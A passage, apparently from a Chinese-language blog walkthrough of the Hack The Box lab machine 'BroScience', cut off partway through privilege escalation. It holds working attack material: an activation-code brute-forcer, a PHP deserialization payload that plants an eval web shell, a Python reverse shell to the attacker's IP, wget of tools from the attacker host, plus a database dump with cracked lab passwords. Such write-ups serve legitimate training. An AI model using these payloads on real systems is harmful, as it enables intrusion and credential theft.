shell = <span class="literal">True</span>, stdout = subprocess.PIPE).communicate()[<span class="number">0</span>].decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">res = req.post(url = register_url, data = register_data, verify = <span class="literal">False</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;created&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">print(<span class="string">&quot;Created.&quot;</span>)</span><br><span class="line">end_time_str = res.headers[<span class="string">&quot;Date&quot;</span>]</span><br><span class="line">end_time = subprocess.Popen(<span class="string">&quot;php -r &#x27;echo strtotime(\&quot;%s\&quot;);&#x27;&quot;</span> % end_time_str, shell = <span class="literal">True</span>, stdout = subprocess.PIPE).communicate()[<span class="number">0</span>].decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">start_time = <span class="built_in">int</span>(start_time)</span><br><span class="line">end_time = <span class="built_in">int</span>(end_time)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(start_time, end_time + <span class="number">1</span>):</span><br><span class="line">code = subprocess.Popen(<span class="string">&quot;php -r &#x27;include \&quot;code.php\&quot;; echo generate_activation_code(%s);&#x27;&quot;</span> % <span class="built_in">str</span>(_), shell = <span class="literal">True</span>, stdout = subprocess.PIPE).communicate()[<span class="number">0</span>].decode()</span><br><span class="line">print(code)</span><br><span class="line">res = req.get(url = activate_url % code)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;Invalid&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">print(<span class="string">&quot;Activated.&quot;</span>)</span><br><span class="line">print(register_data)</span><br></pre></td></tr></table></figure><p><code>code.php</code>如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># code.php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generate_activation_code</span>(<span class="params"><span class="variable">$time</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$chars</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890&quot;</span>;</span><br><span class="line">srand(<span class="variable">$time</span>);</span><br><span class="line"><span class="variable">$activation_code</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">32</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line"><span class="variable">$activation_code</span> = <span class="variable">$activation_code</span> . <span class="variable">$chars</span>[rand(<span class="number">0</span>, strlen(<span class="variable">$chars</span>) - <span class="number">1</span>)];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$activation_code</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>登陆后主页发现一个切换主题按钮，查看其代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&#x27;https://broscience.htb/includes/img.php?path=..%252f/swap_theme.php&#x27;</span> --insecure</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># payload.php</span></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check if user is logged in already</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">    header(<span class="string">&#x27;Location: /index.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Swap the theme</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;includes/utils.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (strcmp(get_theme(), <span class="string">&quot;light&quot;</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">    set_theme(<span class="string">&quot;dark&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    set_theme(<span class="string">&quot;light&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Redirect</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>])) &#123;</span><br><span class="line">    header(<span class="string">&quot;Location: <span class="subst">&#123;$_SERVER[&#x27;HTTP_REFERER&#x27;]&#125;</span>&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    header(<span class="string">&quot;Location: /index.php&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结合<code>utils.php</code>，即可分析出如下反序列化漏洞利用过程</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (strcmp(get_theme(), <span class="string">&quot;light&quot;</span>) === <span class="number">0</span>) -&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_theme</span>(<span class="params"></span>) -&gt;</span></span><br><span class="line">$up_cookie = $_COOKIE[&#x27;user-prefs&#x27;]; -&gt;</span><br><span class="line"><span class="variable">$up</span> = unserialize(base64_decode(<span class="variable">$up_cookie</span>)); -&gt;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AvatarInterface</span> -&gt;</span></span><br><span class="line">public function __wakeup() -&gt; </span><br><span class="line">fwrite(<span class="variable">$f</span>, file_get_contents(<span class="variable">$tmp</span>));</span><br></pre></td></tr></table></figure><p>在<code>$up = unserialize(base64_decode($up_cookie));</code>这步过程中，序列化结果加入一个<code>AvatarInterface</code>对象，反序列化构造这个<code>AvatarInterface</code>对象时会调用<code>__wakeup()</code></p><p>编写<code>payload.php</code>如下，使用<code>php://input</code>和POST数据配合进行内容写入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Avatar</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$imgPath</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$imgPath</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;imgPath = <span class="variable">$imgPath</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"><span class="variable">$tmp</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$f</span> = fopen(<span class="keyword">$this</span>-&gt;imgPath, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">fwrite(<span class="variable">$f</span>, file_get_contents(<span class="variable">$tmp</span>));</span><br><span class="line">fclose(<span class="variable">$f</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AvatarInterface</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$tmp</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$imgPath</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Avatar(<span class="keyword">$this</span>-&gt;imgPath);</span><br><span class="line"><span class="variable">$a</span>-&gt;save(<span class="keyword">$this</span>-&gt;tmp);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserPrefs</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$theme</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$theme</span> = <span class="string">&quot;light&quot;</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;theme = <span class="variable">$theme</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">payload</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$BFL</span> = <span class="keyword">new</span> UserPrefs();</span><br><span class="line"><span class="variable">$BFL</span>-&gt;theme = <span class="keyword">new</span> AvatarInterface();</span><br><span class="line"><span class="variable">$BFL</span>-&gt;theme-&gt;imgPath = <span class="string">&quot;/var/www/html/BFL.php&quot;</span>;</span><br><span class="line"><span class="variable">$BFL</span>-&gt;theme-&gt;tmp = <span class="string">&quot;php://input&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="variable">$BFL</span>));</span><br><span class="line">&#125;</span><br><span class="line">payload();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>生成Payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -f payload.php</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Tzo5OiJVc2VyUHJlZnMiOjE6e3M6NToidGhlbWUiO086MTU6IkF2YXRhckludGVyZmFjZSI6Mjp7czozOiJ0bXAiO3M6MTE6InBocDovL2lucHV0IjtzOjc6ImltZ1BhdGgiO3M6MjE6Ii92YXIvd3d3L2h0bWwvQkZMLnBocCI7fX0&#x3D;</span><br></pre></td></tr></table></figure><p><code>PHPSESSID</code>为登陆后服务器给的值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://broscience.htb/swap_theme.php -H <span class="string">&quot;Cookie: PHPSESSID=5l9ql8diuiej262srrp4chu47e; user-prefs=Tzo5OiJVc2VyUHJlZnMiOjE6e3M6NToidGhlbWUiO086MTU6IkF2YXRhckludGVyZmFjZSI6Mjp7czozOiJ0bXAiO3M6MTE6InBocDovL2lucHV0IjtzOjc6ImltZ1BhdGgiO3M6MjE6Ii92YXIvd3d3L2h0bWwvQkZMLnBocCI7fX0=&quot;</span> -d <span class="string">&#x27;&lt;?php @eval($_POST[&quot;BFL&quot;]);?&gt;&#x27;</span> --insecure</span><br></pre></td></tr></table></figure><p>即可在<code>/var/www/html/BFL.php</code>写入内容<code>&lt;?php @eval($_POST[&quot;BFL&quot;]);?&gt;</code></p><p>构造反弹Shell语句</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;10.10.*.*&#x27;,9998));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);&quot;</span></span><br></pre></td></tr></table></figure><p>监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9998</span><br></pre></td></tr></table></figure><p>进行反弹Shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://broscience.htb/BFL.php -d <span class="string">&#x27;BFL=system(base64_decode(&quot;BASE64_ENCODED_PAYLOAD&quot;));&#x27;</span> --insecure</span><br></pre></td></tr></table></figure><p>获取Shell之后获取tty并查看端口监听信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp/</span><br><span class="line">python3 -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">netstat -antlp</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN      -</span><br></pre></td></tr></table></figure><p>确认5432端口有服务在运行中</p><p>使用chisel进行端口转发</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./chisel_1.8.1_linux_amd64 server -p 9997 --reverse &amp;</span><br><span class="line">python -m http.server 80</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget 10.10.16.3/chisel_1.8.1_linux_amd64</span><br><span class="line">chmod +x chisel_1.8.1_linux_amd64</span><br><span class="line">./chisel_1.8.1_linux_amd64 client 10.10.16.3:9997 R:9996:127.0.0.1:5432</span><br></pre></td></tr></table></figure><p>在本机上连接postgresql</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">psql -h 0.0.0.0 -p 9996 -U dbuser -d broscience -W</span><br><span class="line">RangeOfMotion%777</span><br></pre></td></tr></table></figure><p>查看数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\l</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">                                                  List of databases</span><br><span class="line">    Name    |  Owner   | Encoding |   Collate   |    Ctype    | ICU Locale | Locale Provider |   Access privileges   </span><br><span class="line">------------+----------+----------+-------------+-------------+------------+-----------------+-----------------------</span><br><span class="line"> broscience | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |            | libc            | </span><br><span class="line"> postgres   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |            | libc            | </span><br><span class="line"> template0  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |            | libc            | &#x3D;c&#x2F;postgres          +</span><br><span class="line">            |          |          |             |             |            |                 | postgres&#x3D;CTc&#x2F;postgres</span><br><span class="line"> template1  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |            | libc            | &#x3D;c&#x2F;postgres          +</span><br><span class="line">            |          |          |             |             |            |                 | postgres&#x3D;CTc&#x2F;postgres</span><br><span class="line">(4 rows)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>查看数据库<code>broscience</code>中的表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">\c broscience</span><br><span class="line">RangeOfMotion%777</span><br><span class="line">\dt</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">           List of relations</span><br><span class="line"> Schema |   Name    | Type  |  Owner   </span><br><span class="line">--------+-----------+-------+----------</span><br><span class="line"> public | comments  | table | postgres</span><br><span class="line"> public | exercises | table | postgres</span><br><span class="line"> public | users     | table | postgres</span><br><span class="line">(3 rows)</span><br></pre></td></tr></table></figure><p>查看users表中数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> id |   username    |             password             |            email             |         activation_code          | is_activated | is_admin |         date_created          </span><br><span class="line">----+---------------+----------------------------------+------------------------------+----------------------------------+--------------+----------+-------------------------------</span><br><span class="line">  1 | administrator | 15657792073e8a843d4f91fc403454e1 | administrator@broscience.htb | OjYUyL9R4NpM9LOFP0T4Q4NUQ9PNpLHf | t            | t        | 2019-03-07 02:02:22.226763-05</span><br><span class="line">  2 | bill          | 13edad4932da9dbb57d9cd15b66ed104 | bill@broscience.htb          | WLHPyj7NDRx10BYHRJPPgnRAYlMPTkp4 | t            | f        | 2019-05-07 03:34:44.127644-04</span><br><span class="line">  3 | michael       | bd3dad50e2d578ecba87d5fa15ca5f85 | michael@broscience.htb       | zgXkcmKip9J5MwJjt8SZt5datKVri9n3 | t            | f        | 2020-10-01 04:12:34.732872-04</span><br><span class="line">  4 | john          | a7eed23a7be6fe0d765197b1027453fe | john@broscience.htb          | oGKsaSbjocXb3jwmnx5CmQLEjwZwESt6 | t            | f        | 2021-09-21 11:45:53.118482-04</span><br><span class="line">  5 | dmytro        | 5d15340bded5b9395d5d14b9c21bc82b | dmytro@broscience.htb        | 43p9iHX6cWjr9YhaUNtWxEBNtpneNMYm | t            | f        | 2021-08-13 10:34:36.226763-04</span><br><span class="line">(5 rows)</span><br></pre></td></tr></table></figure><p>构造Hash如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat <span class="built_in">hash</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">15657792073e8a843d4f91fc403454e1:NaCl</span><br><span class="line">13edad4932da9dbb57d9cd15b66ed104:NaCl</span><br><span class="line">bd3dad50e2d578ecba87d5fa15ca5f85:NaCl</span><br><span class="line">a7eed23a7be6fe0d765197b1027453fe:NaCl</span><br><span class="line">5d15340bded5b9395d5d14b9c21bc82b:NaCl</span><br></pre></td></tr></table></figure><p>爆破Hash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 20 <span class="built_in">hash</span> /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure><p>得到如下凭证</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bill:iluvhorsesandgym</span><br><span class="line">dmytro:Aaronthehottest</span><br><span class="line">michael:2applesplus2apples</span><br></pre></td></tr></table></figure><p>尝试登入SSH服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh bill@10.10.11.195</span><br><span class="line">iluvhorsesandgym</span><br></pre></td></tr></table></figure><p>登入成功，查看user.txt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /home/bill/user.txt</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8ca51558ef17c2ec059b606e71696280</span><br></pre></td></tr></table></figure><h2 id="权限提升-28"><a class="markdownIt-Anchor" href="#权限提升-28"></a> 权限提升</h2><p>传递pspy</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 80</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">wget 10.10.*.*/pspy64</span><br><span class="line">chmod +x pspy64</span><br><span class="line">./pspy64</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2023&#x2F;03&#x2F;23 12:54:01 CMD: UID&#x3D;0     PID&#x3D;14400  | &#x2F;bin&#x2F;bash -c &#x2F;opt&#x2F;renew_cert.sh &#x2F;home&#x2F;bill&#x2F;Certs&#x2F;broscience.crt</span><br></pre></td></tr></table></figure><p>查看<code>/opt/renew_cert.sh</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /opt/renew_cert.sh</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$#</span>&quot;</span> -ne 1 ] || [ <span class="variable">$1</span> == <span class="string">&quot;-h&quot;</span> ] || [ <span class="variable">$1</span> == <span class="string">&quot;--help&quot;</span> ] || [ <span class="variable">$1</span> == <span class="string">&quot;help&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Usage: <span class="variable">$0</span> certificate.crt&quot;</span>;</span><br><span class="line">    <span class="built_in">exit</span> 0;</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -f <span class="variable">$1</span> ]; <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">    openssl x509 -<span class="keyword">in</span> <span class="variable">$1</span> -noout -checkend 86400 &gt; /dev/null</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> [ $? -eq 0 ]; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;No need to renew yet.&quot;</span>;</span><br><span class="line">        <span class="built_in">exit</span> 1;</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">    subject=$(openssl x509 -<span class="keyword">in</span> <span class="variable">$1</span> -noout -subject | cut -d <span class="string">&quot;=&quot;</span> -f2-)</span><br><span class="line"></span><br><span class="line">    country=$(<span class="built_in">echo</span> <span class="variable">$subject</span> | grep -Eo <span class="string">&#x27;C = .&#123;2&#125;&#x27;</span>)</span><br><span class="line">    state=$(<span class="built_in">echo</span> <span class="variable">$subject</span> | grep -Eo <span class="string">&#x27;ST = .*,&#x27;</span>)</span><br><span class="line">    locality=$(<span class="built_in">echo</span> <span class="variable">$subject</span> | grep -Eo <span class="string">&#x27;L = .*,&#x27;</span>)</span><br><span class="line">    organization=$(<span class="built_in">echo</span> <span class="variable">$subject</span> | grep -Eo <span class="string">&#x27;O = .*,&#x27;</span>)</span><br><span class="line">    organizationUnit=$(<span class="built_in">echo</span> <span class="variable">$subject</span> | grep -Eo <span class="string">&#x27;OU = .*,&#x27;</span>)</span><br><span class="line">    commonName=$(<span class="built_in">echo</span> <span class="variable">$subject</span> | grep -Eo <span class="string">&#x27;CN = .*,?&#x27;</span>)</span><br><span class="line">    emailAddress=$(openssl x509 -<span class="keyword">in</span> <span class="variable">$1</span> -noout -email)</span><br><span class="line"></span><br><span class="line">    country=<span class="variable">$&#123;country:4&#125;</span></span><br><span class="line">    state=$(<span class="built_in">echo</span> <span class="variable">$&#123;state:5&#125;</span> | awk -F, <span class="string">&#x27;&#123;print $1&#125;&#x27;</span>)</span><br><span class="line">    locality=$(<span class="built_in">echo</span> <span class="variable">$&#123;locality:3&#125;</span> | awk -F, <span class="string">&#x27;&#123;print $1&#125;&#x27;</span>)</span><br><span class="line">    organization=$(<span class="built_in">echo</span> <span class="variable">$&#123;organization:4&#125;</span> | awk -F, <span class="string">&#x27;&#123;print $1&#125;&#x27;</span>)</span><br><span class="line">    organizationUnit=$(<span class="built_in">echo</span> <span class="variable">$&#123;organizationUnit:5&#125;</span> | awk -F, <span class="string">&#x27;&#123;print $1&#125;&#x27;</span>)</span><br><span class="line">    commonName=$(<span class="built_in">echo</span> <span class="variable">$&#123;commonName:5&#125;</span> | awk -F, <span class="string">&#x27;&#123;print $1&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$subject</span>;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Country     =&gt; <span class="variable">$country</span>&quot;</span>;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;State       =&gt; <span class="variable">$state</span>&quot;</span>;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Locality    =&gt; <span class="variable">$locality</span>&quot;</span>;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Org Name    =&gt; <span class="variable">$organization</span>&quot;</span>;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Org Unit    =&gt; <span class="variable">$organizationUnit</span>&quot;</span>;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Common Name =&gt; <span class="variable">$commonName</span>&quot;</span>;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Email       =&gt; <span class="variable">$emailAddress</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;\nGenerating certificate...&quot;</span>;</span><br><span class="line">    openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout /tmp/temp.key -out /tmp/temp.crt -days 365 &lt;&lt;&lt;<span class="string">&quot;<span class="variable">$country</span></span></span><br><span class="line"><span class="string">    <span class="variable">$state</span></span></span><br><span class="line"><span class="string">    <span class="variable">$locality</span></span></span><br><span class="line"><span class="string">    <span class="variable">$organization</span></span></span><br><span class="line"><span class="string">    <span class="variable">$organizationUnit</span></span></span><br><span class="line"><span class="string">    <span class="variable">$commonName</span></span></span><br><span class="line"><span class="string">    <span class="variable">$emailAddress</span></span></span><br><span class="line"><span class="string">    &quot;</span> 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">    /bin/bash -c <span class="string">&quot;mv /tmp/temp.crt /home/bill/Certs/<span 